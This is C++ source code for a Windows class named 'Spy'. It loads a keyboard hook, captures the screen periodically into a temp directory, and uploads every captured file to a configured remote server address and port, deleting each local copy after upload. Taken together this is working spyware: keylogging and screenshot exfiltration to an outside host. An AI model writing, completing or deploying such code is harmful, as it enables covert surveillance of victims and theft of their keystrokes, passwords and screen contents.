#include "spy.h"
#include "stg/dir.h"
#include "stg/scrotfile.h"
#include "sys/kbhook.h"
#include "sys/screenshot.h"
#include "net/uploader.h"
#include "sys/timer.h"

HANDLE Spy::mutex = NULL;
Timer * Spy::scrot_timer = NULL;

void Spy::lock()
{
	WaitForSingleObject(mutex, INFINITE);
}

void Spy::unlock()
{
	ReleaseMutex(mutex);
}

void Spy::get_temp_fname(char * buffer, int l)
{
	for (int i = 0; i < l; ++i)
	{
		buffer[i] = '0' + rand() % 10;
	}
	buffer[l] = '\0';
}

void Spy::path_combine(char * dst, const char * dir, const char * fname)
{
	strcpy(dst, dir);
	int last_index = strlen(dir) - 1;
	if (dir[last_index] != SPY_FILE_SEPARATOR)
		dst[++last_index] = SPY_FILE_SEPARATOR;
	strcpy(dst + last_index + 1, fname);
}

void Spy::get_temp_fpath(char * buffer, const char * fname)
{
	if (fname == NULL)
	{
		char * name = new char[SPY_TMP_FNAME_LTH + 1];
		get_temp_fname(name, SPY_TMP_FNAME_LTH);
		path_combine(buffer, SPY_TMP_DIR, name);
		delete[] name;
	}
	else
	{
		path_combine(buffer, SPY_TMP_DIR, fname);
	}
	LOG("generate temp name: %s", buffer);
}

DWORD Spy::upload_async(LPVOID * dir_path)
{
	// first, we will check for network is available
	// then begin upload all files which saved in temp dir
	lock();
	char * file_path = new char[MAX_PATH];
	char * file_name = new char[MAX_PATH];
	const char * _dir = (const char *)dir_path;
	Dir * dir = new Dir(_dir);
	Uploader * uploader = NULL;
	try
	{
		uploader = new Uploader(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_PORT);
		while (dir->next(file_name))
		{
			path_combine(file_path, _dir, file_name);
			uploader->upload(file_path);
			DeleteFileA(file_path);
		}
	}
	catch (int error)
	{
		LOG_E("Upload error: %d", error);
	}
	catch (...) 
	{
		LOG_E("Unhandled error!");
	}
	if (uploader != NULL)
		delete uploader;
	delete dir;
	delete[] file_name;
	delete[] file_path;
	unlock();
	return 0;
}

DWORD Spy::load(HINSTANCE hinstance)
{
	mutex = CreateMutexA(NULL, false, NULL);
	scrot_timer = new Timer(SPY_TMR_CAPSCR_INTERVAL, take_screenshot);
	scrot_timer->start();
	return KBHook::load(hinstance);
}

void Spy::unload()
{
	KBHook::unload();
	CloseHandle(mutex);
	scrot_timer->stop(false);
	delete scrot_timer;
}

void Spy::take_screenshot()
{
	LOG("Taking a screenshot");
	char * buffer = new char[MAX_PATH];
	get_temp_fpath(buffer);
	Screenshot * screenshot = new Screenshot(0.5f, buffer);
	LOG("Capturing screen and saving to file");
	screenshot->capture_to_file();
	LOG("Done!");
	delete screenshot;
	delete buffer;
}

void Spy::notify_upload()
{
	DWORD thread_id;
	HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)upload_async, SPY_TMP_DIR, 0, &thread_id);
	CloseHandle(thread_handle);
}